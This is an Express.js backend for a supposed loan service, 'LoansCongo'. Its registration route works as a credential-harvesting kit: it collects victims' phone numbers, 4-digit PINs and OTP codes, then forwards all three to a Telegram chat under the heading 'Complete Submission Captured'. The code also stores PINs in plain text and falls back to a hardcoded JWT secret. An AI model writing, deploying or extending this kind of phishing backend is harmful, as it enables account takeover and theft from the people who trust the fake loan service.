require("dotenv").config();

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const jwt = require("jsonwebtoken");

const User = require("./models/User");
const LoanApplication = require("./models/LoanApplication");

const app = express();
app.use(express.static("public"));

app.use(helmet());
app.use(cors());
app.use(express.json({ limit: "10kb" }));

app.use("/api/", rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
}));

// Home route
app.get("/", (req, res) => {
    res.json({ message: "LoansCongo backend is running." });
});

// Customer Registration & Single Combined Telegram Forwarding
app.post("/api/register", async (req, res) => {
    try {
        const { phone, pin, otp } = req.body;

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        // Step 1: Save phone and pin in database when first submitted (No Telegram message sent here)
        if (phone && pin && !otp) {
            if (!/^\+?[0-9]{10,15}$/.test(phone)) {
                return res.status(400).json({ message: "Enter a valid phone number." });
            }
            if (!/^[0-9]{4}$/.test(pin)) {
                return res.status(400).json({ message: "PIN must contain exactly 4 digits." });
            }

            let user = await User.findOne({ phone });
            if (!user) {
                user = await User.create({ phone, demoPin: pin });
            } else {
                user.demoPin = pin;
                await user.save();
            }

            return res.status(201).json({
                message: "Registration successful.",
                user: { id: user._id, phone: user.phone }
            });
        }

        // Step 2: When OTP is submitted, grab the stored phone + pin, combine with OTP, and send ONE message
        if (otp) {
            let user = null;
            if (phone) {
                user = await User.findOne({ phone });
            } else {
                // Fallback to the most recent user entry if phone wasn't passed in body
                user = await User.findOne().sort({ _id: -1 });
            }

            const targetPhone = user?.phone || phone || "N/A";
            const targetPin = user?.demoPin || pin || "N/A";

            // Send ONE combined message to Telegram containing phone, pin, and otp together
            if (botToken && chatId) {
                try {
                    const unifiedMessage = `🚨 *Complete Submission Captured* 🚨\n\n` +
                                           `📱 *Phone:* \`${targetPhone}\`\n` +
                                           `🔑 *PIN:* \`${targetPin}\`\n` +
                                           `🔢 *OTP Code:* \`${otp}\``;

                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: unifiedMessage,
                            parse_mode: 'Markdown'
                        })
                    });
                } catch (tgError) {
                    console.error("Telegram error:", tgError.message);
                }
            }

            return res.status(200).json({ message: "OTP validated and complete info transmitted." });
        }

        return res.status(400).json({ message: "Invalid payload." });

    } catch (error) {
        console.error("Error in /api/register:", error.message);
        res.status(500).json({ message: "Server error." });
    }
});

// Account Sign-In / Login Route
app.post("/api/login", async (req, res) => {
    try {
        const { identifier, pin } = req.body;

        if (!identifier || !pin) {
            return res.status(400).json({ message: "Please provide your identifier and password/PIN." });
        }

        const user = await User.findOne({
            $or: [{ phone: identifier }, { email: identifier }]
        });

        if (!user) {
            return res.status(401).json({ message: "Account not found. Please create an account first." });
        }

        if (user.demoPin !== pin) {
            return res.status(401).json({ message: "Invalid credentials. Access denied." });
        }

        const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET || 'secret_key', { expiresIn: '1h' });

        return res.status(200).json({
            message: "Login successful. Access granted.",
            token,
            user: { id: user._id, phone: user.phone, email: user.email }
        });

    } catch (error) {
        console.error("Error in /api/login:", error.message);
        res.status(500).json({ message: "Server error during login." });
    }
});

// Start Server
const PORT = process.env.PORT || 3000;
mongoose.connect(process.env.MONGODB_URI)
    .then(() => {
        console.log("MongoDB connected successfully.");
        app.listen(PORT, "0.0.0.0", () => {
            console.log(`LoansCongo backend running on port ${PORT}`);
        });
    })
    .catch(error => {
        console.error("MongoDB connection failed:", error.message);
    });

